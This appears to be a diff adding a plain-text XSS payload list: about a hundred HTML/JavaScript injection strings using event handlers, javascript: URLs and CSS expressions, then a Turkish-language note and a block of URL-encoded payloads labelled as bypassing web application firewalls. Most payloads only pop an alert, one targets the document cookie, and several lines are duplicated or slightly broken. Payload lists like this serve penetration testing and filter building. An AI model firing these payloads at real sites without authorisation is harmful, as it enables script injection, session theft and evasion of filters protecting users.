@@ -1,0 +1,132 @@
+===========Default Xss Payloads=============
+
+ <script>alert('XSS')</script>
+ <img src=x onerror=alert('XSS')>
+ <svg onload=alert('XSS')>
+ <body onload=alert('XSS')>
+ <iframe src="javascript:alert('XSS');"></iframe>
+ <input type="text" value="<script>alert('XSS')</script>">
+ <link rel="stylesheet" href="javascript:alert('XSS');">
+ <form action="javascript:alert('XSS');"><input type="submit"></form>
+ <object data="javascript:alert('XSS');"></object>
+ <embed src="javascript:alert('XSS');"></embed>
+ <details open ontoggle=alert('XSS')>
+ <audio src="invalid" onerror="alert('XSS')"></audio>
+ <video><source onerror="alert('XSS')"></video>
+ <marquee onstart="alert('XSS')"></marquee>
+ <meta http-equiv="refresh" content=" ;url=javascript:alert('XSS');">
+ <table background="javascript:alert('XSS')"></table>
+ <div style="background-image: url(javascript:alert('XSS'));">
+ <div onmouseover="alert('XSS')">Hover me</div>
+ <button onclick="alert('XSS')">Click me</button>
+ <textarea onfocus="alert('XSS')">Focus on me</textarea>
+ <keygen autofocus onfocus="alert('XSS')">
+ <base href="javascript:alert('XSS');">
+ <bgsound src="javascript:alert('XSS');">
+ <isindex action="javascript:alert('XSS')">
+ <command onclick="alert('XSS')">Command</command>
+ <fieldset form="javascript:alert('XSS')">
+ <frameset onload="alert('XSS')"></frameset>
+ <applet code="javascript:alert('XSS')"></applet>
+ <base target="javascript:alert('XSS')">
+ <listing onmouseover="alert('XSS')">Hover me</listing>
+ <nobr onclick="alert('XSS')">Click me</nobr>
+ <plaintext onfocus="alert('XSS')">Focus on me</plaintext>
+ <spacer onclick="alert('XSS')">Click me</spacer>
+ <span style="width: expression(alert('XSS'));">
+ <xml id="xss"><script>alert('XSS')</script></xml>
+ <script>alert(document cookie)</script>
+ <img src="x" onerror="document write('<h >XSS</h >')">
+ <iframe srcdoc="<script>alert('XSS')"></script>"></iframe>
+ <div data-text="&lt;script&gt;alert('XSS')&lt;/script&gt;"></div>
+ <input type="text" onfocus="alert('XSS')">
+ <button formaction="javascript:alert('XSS')">Click me</button>
+ <div oncopy="alert('XSS')">Copy me</div>
+ <div oncut="alert('XSS')">Cut me</div>
+ <div onpaste="alert('XSS')">Paste here</div>
+ <form onsubmit="alert('XSS')">
+ <select onchange="alert('XSS')"><option>Option</option></select>
+ <menuitem onclick="alert('XSS')">Click me</menuitem>
+ <input type="image" src="invalid" onerror="alert('XSS')">
+ <frame src="javascript:alert('XSS');"></frame>
+ <div draggable="true" ondragstart="alert('XSS')">Drag me</div>
+ <object type="text/html" data="javascript:alert('XSS');"></object>
+ <div style="border-image-source: url(javascript:alert('XSS'));">
+ <input type="text" pattern=" { ,}" title='XSS{alert("XSS")}' />
+ <progress value=" " max=" " onmouseover="alert('XSS')"></progress>
+ <command onclick="alert('XSS')">Command</command>
+ <data value="javascript:alert('XSS')">Click me</data>
+ <datalist id="xss"><option value="&lt;script&gt;alert('XSS')&lt;/script&gt;"></datalist>
+ <label onmouseenter="alert('XSS')">Hover me</label>
+ <meter value=" " min=" " max=" " low=" " high=" " onmouseover="alert('XSS')"></meter>
+ <optgroup label="XSS" onmouseenter="alert('XSS')"></optgroup>
+ <output onfocus="alert('XSS')">Focus on me</output>
+ <progress onmouseover="alert('XSS')"></progress>
+ <summary onmouseenter="alert('XSS')">Hover me</summary>
+ <textarea oninput="alert('XSS')"></textarea>
+ <track oncuechange="alert('XSS')"></track>
+ <a href="javascript:alert('XSS');">Click me</a>
+ <link rel="stylesheet" href="data:text/css,*{background:url('javascript:alert(XSS)')}">
+ <iframe srcdoc="<img src=x onerror=alert('XSS')>"></iframe>
+ <div style="list-style-image: url(javascript:alert('XSS'));">
+ <form><button formaction="javascript:alert('XSS')">Click me</button></form>
+ <div data-url="javascript:alert('XSS')"></div>
+ <table background="javascript:alert('XSS')">
+ <div style="content: url(javascript:alert('XSS'));">
+ <style>*{background-image: url(javascript:alert('XSS'))}</style>
+ <div style="cursor: url(javascript:alert('XSS')), auto;">
+ <meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
+ <input type="button" value="XSS" onclick="alert('XSS')">
+ <img src="x" onerror="alert('XSS')">
+ <div onmousedown="alert('XSS')">Click me</div>
+ <svg><animate attributeName="xlink:href" to="javascript:alert('XSS')" /></svg>
+ <math href="javascript:alert('XSS')" />
+ <div style="behavior:url(#default#AnchorClick);display:inline-block" onclick="alert('XSS')">Click me</div>
+ <xss style="x:expression(alert('XSS'))">
+ <form action="javascript:alert('XSS')"><input type="submit" value="XSS"></form>
+ <div onmouseenter="alert('XSS')">Hover me</div>
+ <div style="width:expression(alert('XSS'))">
+ <div ondrag="alert('XSS')">Drag me</div>
+ <marquee onstart="alert('XSS')">Start</marquee>
+ <iframe src="javascript:alert('XSS')"></iframe>
+ <object data="javascript:alert('XSS')"></object>
+ <embed src="javascript:alert('XSS')"></embed>
+ <style>@import 'javascript:alert(XSS)';</style>
+ <link rel="import" href="data:text/html,<script>alert('XSS')</script>">
+ <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+ <div onkeypress="alert('XSS')">Press a key</div>
+ <div onkeydown="alert('XSS')">Press a key</div>
+ <div onkeyup="alert('XSS')">Press a key</div>
+ <button oncontextmenu="alert('XSS')">Right-click me</button>
+ <div contenteditable onblur="alert('XSS')">Edit me and unfocus</div>
+ <input onblur="alert('XSS')" value="Blur me">
+
+============================================================================================================
+
+Asagidaki paylodlar Unicode, URL encoding ve JavaScript’in String fromCharCode fonksiyonunu kullanarak karakter kodlaması ile karmaşıklık yaratarak Guvenlik onlemlerini ve bazi filtrelemeleri atlatmaktadir 
+
+===========Bypass Waf's Xss Payloads (Encoded) =============
+
+%3Cscript%3E%60alert%60%28%2FXSS%2F%29%3B%3C%2Fscript%3E
+%3Cimg%20src%3Dx%20onerror%3D%60alert%28%2FXSS%2F%29%60%3E
+%3Csvg%20onload%3D%60alert%28%2FXSS%2F%29%60%3E%3C%2Fsvg%3E
+%3Ciframe%20srcdoc%3D%60%3Cscript%3Ealert%28%2FXSS%2F%29%3B%3C%2Fscript%3E%60%3E%3C%2Fiframe%3E
+%3Cinput%20type%3D%22text%22%20value%3D%22%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E%22%3E
+%3Cbody%20onload%3D%60alert%28%2FXSS%2F%29%60%3E%3C%2Fbody%3E
+%3Cdiv%20style%3D%22width%3A%20expression%28alert%28%2FXSS%2F%29%29%3B%22%3E%3C%2Fdiv%3E
+%3Cbutton%20onclick%3D%60alert%28%2FXSS%2F%29%60%3EClick%20me%3C%2Fbutton%3E
+%3Cform%20action%3D%22javascript%3Aalert%28%2FXSS%2F%29%22%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E
+%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert%28%2FXSS%2F%29%22%3E
+%3Csvg%20onload%3D%60alert%28%60XSS%60%29%60%3E
+%3Cimg%20src%3Dx%20onerror%3D%60alert%28%60XSS%60%29%60%3E
+%3Cbody%20onload%3D%60alert%28%60XSS%60%29%60%3E
+%3Ciframe%20src%3D%60javascript%3Aalert%28%60XSS%60%29%60%3E%3C%2Fiframe%3E
+%3Cinput%20onfocus%3D%60alert%28%60XSS%60%29%60%3E
+%3Cbutton%20onclick%3D%60alert%28%60XSS%60%29%60%3EClick%3C%2Fbutton%3E
+%3Cform%20action%3D%60javascript%3Aalert%28%60XSS%60%29%60%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E
+%3Cobject%20data%3D%60javascript%3Aalert%28%60XSS%60%29%60%3E%3C%2Fobject%3E
+%3Cembed%20src%3D%60javascript%3Aalert%28%60XSS%60%29%60%3E
+%3Ciframe%20srcdoc%3D%60%3Cscript%3Ealert%28%60XSS%60%29%3C%2Fscript%3E%60%3E%3C%2Fiframe%3E
+
+
+
